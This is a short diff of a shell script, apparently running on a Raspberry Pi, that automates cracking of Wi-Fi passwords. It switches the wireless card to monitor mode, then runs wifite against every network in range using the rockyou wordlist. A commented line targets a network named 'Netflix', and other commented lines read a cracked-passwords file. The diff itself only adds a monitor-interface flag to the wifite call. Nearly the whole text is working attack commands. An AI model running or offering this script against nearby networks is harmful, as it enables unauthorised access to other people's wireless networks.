@@ -2,7 +2,7 @@
 #sudo rm /home/pi/cracked.txt
 sudo /etc/init.d/network-manager stop
 sudo airmon-ng start wlan0
-sudo /home/pi/reaver-1.4/src/wifite.py -all --pow 50 -dict /pentest/passwords/wordlists/rockyou.txt -aircrack > /home/pi/reaver-1.4/src/log.txt
+sudo /home/pi/reaver-1.4/src/wifite.py -i mon0 -all --pow 50 -dict /pentest/passwords/wordlists/rockyou.txt -aircrack > /home/pi/reaver-1.4/src/log.txt
 #sudo /home/pi/reaver-1.4/src/wifite.py -e "Netflix" --pow 50 -dict /pentest/passwords/wordlists/darkc0de.lst -aircrack > /home/pi/reaver-1.4/src/log.txt
 # line=$(head -n 1 /home/pi/cracked.txt);
 # linesplit=(${line//\t/});
